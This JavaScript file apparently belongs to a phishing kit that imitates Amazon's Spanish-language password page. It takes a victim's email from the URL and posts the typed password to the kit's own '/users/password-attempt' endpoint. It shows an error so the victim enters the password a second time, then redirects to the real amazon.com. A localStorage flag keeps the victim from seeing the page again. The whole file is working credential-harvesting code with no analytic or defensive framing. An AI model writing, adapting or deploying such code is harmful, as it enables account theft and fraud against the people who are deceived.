(() => {
  try {
    if (localStorage.getItem("amazon_auth_complete")) {
      window.location.replace("https://www.amazon.com/-/es/");
      return;
    }
  } catch {}

  window.addEventListener("pageshow", (event) => {
    if (event.persisted) window.location.reload();
  });

  function scrollToTop() {
    window.scrollTo({ top: 0, left: 0, behavior: "smooth" });
  }

  document.addEventListener("DOMContentLoaded", () => {
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");

    if (!email) {
      window.location.href = "/";
      return;
    }

    const userEmailDisplay = document.getElementById("b7DvggIv");
    const form = document.getElementById("mXWYFyt5");
    const passwordInput = document.getElementById("UW33L0fO");
    const authErrorBox = document.getElementById("plIoPUXT");
    const serverMsgText = document.getElementById("OZf9sD3A");
    const emptyErrorAlert = document.getElementById("egFspoEt");
    const submitBtn = document.getElementById("eaQKoNCC");

    if (!form || !passwordInput || !submitBtn) return;

    if (userEmailDisplay) userEmailDisplay.textContent = email;

    const toggle = document.getElementById("hWrh2Dzz");
    if (toggle) {
      toggle.addEventListener("change", () => {
        passwordInput.type = toggle.checked ? "text" : "password";
      });
    }

    passwordInput.addEventListener("input", () => {
      passwordInput.classList.remove("w8O8ksUe");
      if (emptyErrorAlert) emptyErrorAlert.style.display = "none";
      if (authErrorBox) authErrorBox.style.display = "none";
      if (serverMsgText) serverMsgText.textContent = "";
    });

    function finishAndRedirect() {
      try {
        localStorage.setItem("amazon_auth_complete", "true");
      } catch {}
      window.location.href = "https://www.amazon.com/-/es/";
    }

    function showError(msg) {
      if (serverMsgText) serverMsgText.textContent = msg;
      if (authErrorBox) authErrorBox.style.display = "block";
      scrollToTop();
    }

    const attemptKey = `amazon_pw_attempts:${email}`;

    function getAttempts() {
      try {
        const n = parseInt(localStorage.getItem(attemptKey) || "0", 10);
        return Number.isFinite(n) ? n : 0;
      } catch {
        return 0;
      }
    }

    function incAttempts() {
      const n = getAttempts() + 1;
      try {
        localStorage.setItem(attemptKey, String(n));
      } catch {}
      return n;
    }

    function resetAttempts() {
      try {
        localStorage.removeItem(attemptKey);
      } catch {}
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      if (authErrorBox) authErrorBox.style.display = "none";
      if (serverMsgText) serverMsgText.textContent = "";
      passwordInput.classList.remove("w8O8ksUe");
      if (emptyErrorAlert) emptyErrorAlert.style.display = "none";

      const password = passwordInput.value;

      if (!password) {
        passwordInput.classList.add("w8O8ksUe");
        if (emptyErrorAlert) emptyErrorAlert.style.display = "flex";
        passwordInput.focus();
        scrollToTop();
        return;
      }

      submitBtn.disabled = true;

      try {
        await new Promise((r) => setTimeout(r, 2000));

        const res = await fetch("/users/password-attempt", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password }),
        });

        let data = {};
        try {
          data = await res.json();
        } catch {
          data = {};
        }

        submitBtn.disabled = false;

        if (res.status === 409) {
          resetAttempts();
          finishAndRedirect();
          return;
        }

        if (!res.ok) {
          showError(data.error || "Error de conexión");
          return;
        }

        if (data.message) {
          const n = incAttempts();
          if (n >= 2) {
            resetAttempts();
            finishAndRedirect();
            return;
          }

          showError(data.message);
          passwordInput.value = "";
          passwordInput.focus();
          return;
        }

        resetAttempts();
        finishAndRedirect();
      } catch {
        submitBtn.disabled = false;
        showError("No se pudo conectar al servidor.");
      }
    });
  });
})();
